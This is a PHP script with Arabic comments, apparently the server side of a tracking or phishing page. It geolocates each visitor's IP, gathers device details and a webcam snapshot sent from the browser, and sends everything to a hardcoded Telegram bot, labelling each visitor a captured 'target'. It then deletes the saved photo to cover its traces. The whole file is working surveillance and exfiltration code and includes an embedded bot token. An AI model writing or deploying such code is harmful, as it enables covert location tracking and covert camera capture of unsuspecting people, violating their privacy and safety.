<?php
// إعدادات الوصول للهوية الرقمية
$botToken = "8491567231:AAE7RGo9hcl5bSx7jze7_tqbIF13-7ObywM";
$chatId = "5790968225"; 

// استقبال البيانات الخام من المتصفح
$input = json_decode(file_get_contents('php://input'), true);
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');

// استخبارات الموقع الجغرافي (Advanced Intelligence)
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=17031167"));

// بناء التقرير الاستخباراتي
$msg = "🥷 **NEW TARGET CAPTURED** 🥷\n\n";
$msg .= "📍 **Location Details:**\n";
$msg .= "🗺️ Country: {$details->country} ({$details->countryCode})\n";
$msg .= "🏙️ City: {$details->city}\n";
$msg .= "🛰️ Lat/Lon: `{$details->lat}, {$details->lon}`\n";
$msg .= "🌐 IP: `{$ip}`\n";
$msg .= "📡 ISP: {$details->isp}\n";
$msg .= "🛡️ Proxy/VPN: " . ($details->proxy ? "🚨 YES" : "✅ NO") . "\n\n";

if (isset($input['info'])) {
    $i = $input['info'];
    $msg .= "💻 **Hardware Intelligence:**\n";
    $msg .= "🖥️ Screen: {$i['screen']}\n";
    $msg .= "⚙️ OS/Platform: {$i['platform']}\n";
    $msg .= "🧠 Cores: {$i['cores']} | Memory: ~{$i['memory']}GB\n";
    $msg .= "🌐 Lang: {$i['lang']}\n";
}

// إرسال التقرير النصي فوراً
file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg) . "&parse_mode=Markdown");

// معالجة وإرسال الصورة (في حال تفعيل الكاميرا)
if (isset($input['photo'])) {
    $photo = str_replace('data:image/jpeg;base64,', '', $input['photo']);
    $photo = str_replace(' ', '+', $photo);
    $data = base64_decode($photo);
    $fileName = 'capture_' . time() . '.jpg';
    file_put_contents($fileName, $data);

    $sendPhotoUrl = "https://api.telegram.org/bot$botToken/sendPhoto";
    $postFields = [
        'chat_id' => $chatId,
        'photo' => new CURLFile(realpath($fileName)),
        'caption' => "📸 Snapshot from Target: $ip"
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $sendPhotoUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    // مسح أثر الصورة من السيرفر بعد الإرسال لحماية خصوصية العملية
    unlink($fileName);
}
?>
